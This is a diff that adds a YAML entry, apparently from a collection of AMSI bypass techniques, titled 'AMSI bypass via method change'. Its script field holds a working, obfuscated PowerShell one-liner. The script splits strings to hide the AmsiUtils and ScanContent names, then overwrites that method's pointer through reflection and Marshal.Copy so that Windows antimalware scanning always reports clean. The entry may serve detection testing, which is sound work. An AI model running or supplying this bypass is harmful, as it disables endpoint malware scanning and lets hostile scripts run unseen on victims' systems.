@@ -1,0 +1,13 @@
+name: ecfirstAMSI-ScanContentChange
+authors:
+  - name: Ben Miller
+    handle: '@secur3'
+    link: www.ecfirst.com
+description: |
+  AMSI bypass via method change
+comments:
+  - https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-PowerShell?tab=readme-ov-file#Reflection-ScanContent-Change
+language: powershell
+min_language_version: '3'
+script: |
+  class MyClass{static [int] MyMethod([string]$p1, [string]$p2){return 1}}; $assembly = [Ref].Assembly.GetType(('S'+'ys'+'tem.Ma'+'na'+'gem'+'ent.Aut'+'om'+'ation.'+'Am'+'si'+'Ut'+'ils')).GetMethods(('NonP'+'ub'+'lic,st'+'ati'+'c')) | ? { $_.Name -eq ('S'+'ca'+'nC'+'on'+'ten'+'t') }; $method = [MyClass].GetMethods() | ? { $_.Name -eq 'MyMethod' }; [System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$method.MethodHandle.Value + 8)), 0, [long]$assembly.MethodHandle.Value + 8, 1);
